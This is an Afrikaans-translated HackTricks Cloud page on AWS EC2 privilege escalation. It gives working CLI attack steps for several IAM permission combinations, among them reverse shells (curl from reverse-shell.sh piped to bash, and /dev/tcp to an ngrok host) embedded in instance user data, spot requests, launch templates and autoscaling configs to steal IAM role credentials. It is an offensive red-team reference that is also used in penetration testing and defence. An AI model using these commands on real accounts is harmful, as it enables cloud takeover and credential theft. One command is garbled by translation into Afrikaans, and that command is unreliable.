# AWS - EC2 Bevoorregte Escalatie

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## EC2

Vir meer **inligting oor EC2** kyk:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

'n Aanvaller kan **'n instansie skep wat 'n IAM rol aanheg en dan toegang tot die instansie** kry om die IAM rol-gedragskode van die metadata-eindpunt te steel.

* **Toegang via SSH**

Voer 'n nuwe instansie uit met 'n **geskep** **ssh-sleutel** (`--key-name`) en ssh dan daarin (as jy 'n nuwe een wil skep, mag jy die toestemming `ec2:CreateKeyPair` nodig h√™).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **Toegang via omgekeerde dop in gebruikersdata**

Jy kan 'n nuwe instansie hardloop met behulp van 'n **gebruikersdata** (`--user-data`) wat 'n **omgekeerde dop** na jou sal stuur. Jy hoef nie op hierdie manier 'n sekuriteitsgroep te spesifiseer nie.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
Wees versigtig met GuradDuty as jy die geloofsbriewe van die IAM rol buite die instansie gebruik:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**Potensi√´le Impak:** Direkte privilige-escalation na enige EC2 rol wat aan bestaande instansie profiele geheg is.

#### Privilege-escalation na ECS

Met hierdie stel toestemmings kan jy ook **'n EC2 instansie skep en dit binne 'n ECS cluster registreer**. Op hierdie manier sal ECS **diens** binne die **EC2 instansie** waar jy toegang het **uitgevoer** word en dan kan jy daardie dienste (docker houers) binnegaan en **hul ECS rolle wat geheg is, steel**.

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

Om te leer hoe om **ECS-diens om te dwing om uit te voer** op hierdie nuwe EC2-instantie, kyk:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

As jy **nie 'n nuwe instansie kan skep** nie, maar die toestemming `ecs:RegisterContainerInstance` het, kan jy dalk die instansie binne die groep registreer en die uitgeskakelde aanval uitvoer.

**Potensi√´le Impak:** Direkte privesc na ECS-rolle wat aan take geheg is.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Soortgelyk aan die vorige scenario, kan 'n aanvaller met hierdie toestemmings die **IAM-rol van 'n gekompromitteerde instansie verander** sodat hy nuwe geloofsbriewe kan steel.\
Aangesien 'n instansieprofiel slegs 1 rol kan h√™, as die instansieprofiel **reeds 'n rol het** (gewone geval), sal jy ook **`iam:RemoveRoleFromInstanceProfile`** benodig.

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

Indien die **instansieprofiel 'n rol het** en die aanvaller **dit nie kan verwyder nie**, is daar 'n ander omweg. Hy kan 'n **instansieprofiel sonder 'n rol vind** of **'n nuwe een skep** (`iam:CreateInstanceProfile`), die **rol by daardie instansieprofiel voeg** (soos voorheen bespreek), en die gekompromiteerde instansieprofiel aan 'n gekompromiteerde instansie **koppel:**

* As die instansie **geen instansieprofiel het nie** (`ec2:AssociateIamInstanceProfile`) \* 

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**Potensi√´le Impak:** Direkte privesc na 'n ander EC2 rol (jy moet 'n AWS EC2 instansie gekompromiteer het en 'n paar ekstra toestemmings of 'n spesifieke instansieprofielstatus h√™).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

Met hierdie toestemmings is dit moontlik om die instansieprofiel wat aan 'n instansie gekoppel is, te verander, sodat as die aanval alreeds toegang tot 'n instansie gehad het, hy in staat sal wees om geloofsbriewe vir meer instansieprofielrolle te steel deur die een wat daarmee geassosieer is, te verander.

* As dit **'n instansieprofiel het**, kan jy die instansieprofiel **verwyder** (`ec2:DisassociateIamInstanceProfile`) en dit **assosieer** \*
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* of **vervang** die **instansieprofiel** van die gekompromitteerde instansie (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
```html
<p>aws ec2 vervang-iam-instansie-profiel-assosiasie --iam-instansie-profiel Naam=<waarde> --assosiasie-id <waarde></p>
```
```
````
{% endcode %}

**Potensi√´le Impak:** Direkte privesc na 'n ander EC2 rol (jy moet 'n AWS EC2 instansie gekompromiteer het en 'n paar ekstra toestemmings of spesifieke instansieprofielstatus benodig).

### `ec2:RequestSpotInstances`,`iam:PassRole`

'N Aanvaller met die toestemmings **`ec2:RequestSpotInstances`en`iam:PassRole`** kan 'n **Spot Instansie aanvra** met 'n **EC2 Rol aangeheg** en 'n **rev shell** in die **gebruikersdata**.\
Sodra die instansie uitgevoer word, kan hy die IAM rol **steel**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

'n Aanvaller met die **`ec2:ModifyInstanceAttribute`** kan die instansie se eienskappe wysig. Onder hulle kan hy die **gebruikersdata verander**, wat impliseer dat hy die instansie **willekeurige data kan laat loop**. Dit kan gebruik word om 'n **rev shell na die EC2-instansie** te kry.

Let daarop dat die eienskappe slegs **gewysig kan word terwyl die instansie gestop is**, dus die **toestemmings** **`ec2:StopInstances`** en **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Potensi√´le Impak:** Direkte privesc na enige EC2 IAM Rol wat aan 'n geskepte instansie geheg is.

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

'n Aanvaller met die regte **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`en `ec2:ModifyLaunchTemplate`** kan 'n **nuwe Lanceer Templaat weergawe** skep met 'n **rev shell in** die **gebruikersdata** en **enige EC2 IAM Rol daarop**, die verstek weergawe verander, en **enige Autoscaler groep** wat **daardie Lanceer Templaat** gebruik wat **gekonfigureer** is om die **nuutste** of die **verstek weergawe** te gebruik sal die instansies **herlaai** met daardie templaat en die rev shell uitvoer.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**Potensi√´le Impak:** Direkte privesc na 'n ander EC2 rol.

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

'n Aanvaller met die regte **`autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`** kan **'n Opstartkonfigurasie skep** met 'n **IAM Rol** en 'n **rev shell** binne die **gebruikersdata**, dan 'n **autoscaling groep skep** van daardie konfigurasie en wag vir die rev shell om die **IAM Rol te steel**.
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**Potensi√´le Impak:** Direkte privesc na 'n ander EC2 rol.

### `!autoscaling`

Die stel van regte **`ec2:CreateLaunchTemplate`** en **`autoscaling:CreateAutoScalingGroup`** **is nie genoeg om** voorregte te eskaleer na 'n IAM rol nie, omdat om die rol wat gespesifiseer is in die Lanceerkonfigurasie of in die Lanceersjabloon aan te heg **jy toestemmings nodig het `iam:PassRole` en `ec2:RunInstances`** (wat 'n bekende privesc is).

### `ec2-instance-connect:SendSSHPublicKey`

'N Aanvaller met die reg **`ec2-instance-connect:SendSSHPublicKey`** kan 'n ssh-sleutel by 'n gebruiker voeg en dit gebruik om toegang te verkry (as hy ssh-toegang tot die instansie het) of om voorregte te eskaleer.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**Potensi√´le Impak:** Direkte privesc na die EC2 IAM-rolle wat aan lopende instansies geheg is.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

'n Aanvaller met die toestemming **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** kan **'n ssh-sleutel by 'n seri√´le verbinding voeg**. As die seri√´le nie geaktiveer is nie, benodig die aanvaller die toestemming **`ec2:EnableSerialConsoleAccess` om dit te aktiveer**.

Om met die seri√´le poort te verbind, moet jy ook **die gebruikersnaam en wagwoord van 'n gebruiker binne die masjien weet**.

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

Hierdie metode is nie baie nuttig vir privilige-escalation nie, aangesien jy 'n gebruikersnaam en wagwoord moet weet om dit te benut.

**Potensi√´le Impak:** (Hoogs onbewysbaar) Direkte privilige-escalation na die EC2 IAM-rolle wat aan lopende instansies geheg is.

## Verwysings

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslaan.

</details>
{% endhint %}
